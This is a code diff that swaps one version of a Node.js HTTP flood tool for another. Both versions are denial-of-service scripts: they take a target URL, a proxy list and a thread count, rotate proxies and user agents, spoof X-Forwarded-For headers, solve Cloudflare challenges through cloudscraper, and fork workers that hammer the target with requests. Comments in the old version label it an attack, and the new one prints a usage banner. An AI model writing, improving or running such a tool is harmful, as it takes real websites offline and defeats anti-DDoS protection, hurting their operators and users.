@@ -1,110 +1,104 @@
-require('events').EventEmitter.defaultMaxListeners = Infinity;
+require('events').EventEmitter.defaultMaxListeners = 0;
 const cloudscraper = require('cloudscraper');
-const axios = require('axios');
-const http = require('http');
-const https = require('https');
 const path = require('path');
 const fs = require('fs');
+var random_useragent = require('random-useragent');
+const cryptoRandomString = require('crypto-random-string');
 const cluster = require('cluster');
-const userAgents = require('user-agents');
-const tough = require('tough-cookie');
-const { SocksProxyAgent } = require('socks-proxy-agent');
-const { HttpsProxyAgent } = require('https-proxy-agent');
 
-// Конфиг
-const TARGET_URL = process.argv[2];
-const ATTACK_DURATION = parseInt(process.argv[3]) * 1000;
-const REQUESTS_PER_PROXY = parseInt(process.argv[4]);
-const PROXY_FILE = process.argv[5];
-const THREAD_COUNT = parseInt(process.argv[6]);
-
-const PROXIES = fs.readFileSync(PROXY_FILE, 'utf-8').split('\n').filter(Boolean);
-const ACTIVE_PROXIES = new Set();
-
-// Генератор фейковых TLS параметров
-const getTLSFingerprint = () => ({
-  ciphers: [
-    'TLS_AES_128_GCM_SHA256',
-    'TLS_AES_256_GCM_SHA384',
-    'TLS_CHACHA20_POLY1305_SHA256'
-  ].join(':'),
-  alpnProtocols: ['h2', 'http/1.1']
-});
-
-// Создаем кастомные агенты
-const createAgent = (proxy) => {
-  if (proxy.startsWith('socks')) {
-    return new SocksProxyAgent(proxy, { timeout: 5000 });
-  }
-  return new HttpsProxyAgent(proxy, { timeout: 5000 });
-};
-
-// Основная функция атаки
-const attack = async () => {
-  while (true) {
-    try {
-      const proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
-      if (!ACTIVE_PROXIES.has(proxy)) {
-        ACTIVE_PROXIES.add(proxy);
-        console.log(`[+] Активирован прокси: ${proxy}`);
-      }
-
-      const agent = createAgent(proxy);
-      const userAgent = new userAgents({ deviceCategory: 'desktop' }).toString();
-      const cookieJar = new tough.CookieJar();
-
-      const options = {
-        uri: TARGET_URL + '?cache=' + Date.now(),
-        method: ['GET', 'POST', 'HEAD'][Math.floor(Math.random() * 3)],
-        headers: {
-          'User-Agent': userAgent,
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-          'Accept-Language': 'en-US,en;q=0.9',
-          'Cache-Control': 'no-cache',
-          'Pragma': 'no-cache',
-          'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
-        },
-        agent: agent,
-        jar: cookieJar,
-        timeout: 8000,
-        followAllRedirects: true,
-        challengesToSolve: 3
-      };
-
-      // Основной запрос
-      await cloudscraper(options);
-      console.log(`[+] Успешный запрос через ${proxy}`);
-
-      // Дополнительные запросы
-      for (let i = 0; i < REQUESTS_PER_PROXY; i++) {
-        setTimeout(() => {
-          cloudscraper(options).catch(() => {});
-        }, Math.random() * 1000);
-      }
-
-    } catch (err) {
-      // console.error(`[!] Ошибка: ${err.message}`);
-      continue;
-    }
-  }
-};
-
-// Запуск в кластере
-if (cluster.isMaster) {
-  console.log(`[!] Запускаю ${THREAD_COUNT} потоков...`);
-  for (let i = 0; i < THREAD_COUNT; i++) {
-    cluster.fork();
-  }
-} else {
-  attack();
+function randomNumber(min, max) {  
+    return Math.floor(Math.random() * (max - min) + min); 
 }
 
-// Таймер завершения
-setTimeout(() => {
-  console.log('[!] Атака завершена');
-  process.exit(0);
-}, ATTACK_DURATION);
+if (process.argv.length !== 7) {
+    console.log(`                       
+Usage: node ${path.basename(__filename)} <url> <time> <ConnectPerThread> <proxies> <thread>
+Usage: node ${path.basename(__filename)} <http://example.com> <60> <250> <proxy.txt> <1>
+                                                   
+`);
+    process.exit(0);
+}
 
-// Обработка ошибок
-process.on('uncaughtException', () => {});
-process.on('unhandledRejection', () => {});
+const target = process.argv[2],
+    time = process.argv[3],
+    fileproxy = process.argv[5],
+    threads = process.argv[6],
+    perthreads = process.argv[4];
+
+let proxies = fs.readFileSync(fileproxy, 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
+
+async function req(){
+        var Array_method = ['HEAD',  'GET',  'POST'];
+        var randommethod = Array_method[Math.floor(Math.random()*Array_method.length)];
+        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
+        var proxiedRequest = cloudscraper.defaults({ proxy: 'http://'+proxy },{ proxy: 'https://'+proxy });
+        var data = '?' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'}) + '=' + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8})+ '&' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8});
+        var options = {
+            method: randommethod,
+			cloudflareTimeout: 5000,
+			cloudflareMaxTimeout: 10000,
+			challengesToSolve: 10,
+			resolveWithFullResponse: true,
+            headers: {'User-Agent': random_useragent.getRandom(),'Referer': target,'X-Forwarded-For': randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255),},
+            uri: target + data,
+            data: data
+        };
+        await proxiedRequest(options).then(function (response) {
+			//console.log('Response: ',response);
+            console.log("BYPASS_PACKET_SENT");
+            for(let i = 0; i < perthreads; ++i) {
+                proxiedRequest(options).then(function (response) {
+                    //console.log('Response: ',response);
+                    console.log("REQ_PACKET_SENT: ",i);
+                }).catch(function (err) {
+                    //console.log(err.message);
+                    return req();
+                });
+            };
+            return req();
+        }).catch(function (err) {
+			return req();
+        });
+    return req();
+}
+
+function run(){
+ setInterval(() => {
+     req();
+ });	
+}
+main();
+function main(){
+    if (process.argv.length !== 7) {
+        console.log(`
+Usage: node ${path.basename(__filename)} <url> <time> <ConnectPerThread> <proxies> <thread>
+Usage: node ${path.basename(__filename)} <http://example.com> <60> <250> <proxy.txt> <1>
+
+`);
+        process.exit(0);
+    }else{    
+    if (cluster.isMaster) {
+        for (let i = 0; i < threads; i++) {
+         cluster.fork();
+        }
+        cluster.on('exit', (worker, code, signal) => {
+          console.log(`Threads: ${worker.process.pid} ended`);
+        });
+      } else {
+        run();
+        console.log(`Threads: ${process.pid} started`);
+      }
+    }
+}
+
+setTimeout(() => {
+    console.log('Attack ended.');
+    process.exit(0)
+}, time * 1000);
+
+process.on('uncaughtException', function (err) {
+    // console.log(err);
+});
+process.on('unhandledRejection', function (err) {
+    // console.log(err);
+});
